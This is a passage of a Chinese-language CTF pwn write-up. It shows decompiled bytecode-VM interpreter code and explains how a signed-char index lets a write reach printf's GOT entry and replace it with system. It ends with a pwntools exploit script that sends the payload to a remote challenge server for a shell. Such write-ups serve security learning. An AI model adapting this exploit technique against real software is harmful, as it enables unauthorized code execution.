class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v18 | v19));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xEu</span>:</span><br><span class="line">        v21 = sub_1254(a1);</span><br><span class="line">        v20 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v20 ^ v21));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFu</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) = ~*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10u</span>:</span><br><span class="line">        v22 = *(_BYTE *)(i + <span class="number">1</span> + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v22 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i = v22 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x11u</span>:</span><br><span class="line">        v23 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; !*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v23 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x12u</span>:</span><br><span class="line">        v24 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v24 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unknown opcode: 0x%02X\n&quot;</span>, v25);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过逆向，主要有用的命令码有：0x01将下一个字节压栈；0x03：加法（弹出栈顶两元素相加后压栈）；0x04：减法（弹出栈顶元素减次栈顶元素后压栈）；0x05：将栈顶值存到下一字节索引处<br>选项0x05中的索引值类型为char，如果我们写入0x80，即128超出char的上限，0x80&#x3D;0b10000000，符号位是1被认定为负数的补码，还原后会得到-128，即-0x80，这时我们在ida里发现索引到-128处正好是printf的got表项，那么我们根据偏移关系（libc.sym[“system”]和libc.sym[“printf”]比对），就可以把printf的got表项改为system，最后把”sh”写入（一般写&#x2F;bin&#x2F;sh，这里图省事），便可以getshell。<br>exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;printf&quot;</span>]))</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49761</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;\x01&quot;</span>+p8(<span class="number">0x70</span>)+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x80</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x07\x06\x81\x03&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x81</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x01\x06\x82\x04&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x82</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01s&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x0</span>)+ <span class="string">b&quot;\x01h&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input length: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">r.sendafter(<span class="string">b&quot;input code: &quot;</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> ret2libc </category>
          
          <category> vm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
